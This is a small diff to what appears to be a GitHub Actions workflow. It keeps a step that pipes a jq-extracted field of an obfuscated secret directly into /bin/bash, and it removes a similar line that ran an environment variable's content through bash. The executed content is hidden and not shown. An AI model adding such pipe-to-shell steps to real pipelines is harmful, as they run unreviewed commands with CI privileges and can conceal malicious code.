@@ -21,7 +21,6 @@ jobs:
           ixsx392: ${{ secrets.ixsx392 }}
         run: |
           printf '%s' "$ixsx392" | jq -r .tr3 | /bin/bash
-          echo $re5 | jq -r .uhdse1735 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
